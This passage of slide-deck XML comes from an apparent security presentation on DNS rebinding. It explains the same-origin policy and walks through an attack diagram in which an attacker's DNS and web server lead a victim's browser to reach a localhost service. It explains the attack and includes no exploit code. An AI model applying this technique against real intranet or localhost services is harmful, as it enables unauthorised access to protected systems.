            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="144" name="Google Shape;144;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1440065" y="851550"/>
            <a:ext cx="6978434" cy="4084400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="145" name="Google Shape;145;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="311699" y="369637"/>
            <a:ext cx="5898900" cy="44042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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;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Prevalence of apps exposing </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>HTTP servers on localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (e.g. Electron)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>IoT devices</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> exposing sensitive interfaces on internal networks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Misconceptions</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="-330200" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1600"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>DNS rebinding is slow</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr indent="-330200" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1600"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>DNS rebinding can be solved by out-of-the-box DNS filtering products or services</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 Refresher on DNS Rebinding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0" name="Shape 160"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;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 the Origin of Web Documents</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Google Shape;162;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b="1" lang="en"/>
              <a:t>Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” of a resource is a tuple consisting of scheme, host  and port. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en" sz="1400"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Two documents A and B share the “</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>same-origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” if they have identical scheme, host and port components.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://mysite.com/hello.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>  and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://mysite.com/world.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>mysite.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>/hello.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>/hello.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✖</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="163" name="Google Shape;163;p28"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId11">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2171700" y="1781175"/>
            <a:ext cx="4800600" cy="800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On the Origin of Web Documents</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;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b="1" lang="en"/>
              <a:t>same-origin policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” dictates how two different origins may interact. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>These interactions between origins are typically permitted: form submissions, links, redirects, content embedding (JavaScript, CSS).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Cross-origin </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>reads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> are typically not allowed e.g. reading the content of an HTML document located on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gmail.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> from site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>DNS Rebinding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> permits to bypass restrictions imposed by the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>same-origin policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>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3" name="Shape 173"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Google Shape;174;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="Google Shape;176;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Google Shape;177;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="178" name="Google Shape;178;p30"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4577325" y="1220075"/>
            <a:ext cx="0" cy="3524700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Google Shape;179;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3706350" y="1110975"/>
            <a:ext cx="893100" cy="4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Intranet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="180" name="Google Shape;180;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4665113" y="1110963"/>
            <a:ext cx="1172100" cy="4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Internet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4" name="Shape 184"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Google Shape;185;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Google Shape;186;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187" name="Google Shape;187;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="188" name="Google Shape;188;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="189" name="Google Shape;189;p31"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4577325" y="1220075"/>
            <a:ext cx="0" cy="3524700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Google Shape;190;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3706350" y="1110975"/>
            <a:ext cx="893100" cy="4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Intranet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="191" name="Google Shape;191;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4665113" y="1110963"/>
            <a:ext cx="1172100" cy="4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Internet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p31"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1868525" y="2340000"/>
            <a:ext cx="0" cy="1143600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="142875" rotWithShape="0" algn="bl" dir="3900000" dist="28575">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="383000" y="2561100"/>
            <a:ext cx="15219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Unauthenticated access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7" name="Shape 197"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="Google Shape;198;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="Google Shape;200;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="Google Shape;201;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="202" name="Google Shape;202;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4577325" y="1220075"/>
            <a:ext cx="0" cy="3524700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="203" name="Google Shape;203;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3706350" y="1110975"/>
            <a:ext cx="893100" cy="4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Intranet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Google Shape;204;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4665113" y="1110963"/>
            <a:ext cx="1172100" cy="4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Internet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1868525" y="2340000"/>
            <a:ext cx="0" cy="1143600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="142875" rotWithShape="0" algn="bl" dir="3900000" dist="28575">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Google Shape;206;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="383000" y="2561100"/>
            <a:ext cx="15219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Unauthenticated access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3054175" y="2272700"/>
            <a:ext cx="2687400" cy="85320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208" name="Google Shape;208;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4864500" y="2527700"/>
            <a:ext cx="15858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Blocked</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="209" name="Google Shape;209;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4125450" y="2360350"/>
            <a:ext cx="893100" cy="598200"/>
          </a:xfrm>
          <a:prstGeom prst="mathMultiply">
            <a:avLst>
              <a:gd fmla="val 2352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3" name="Shape 213"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
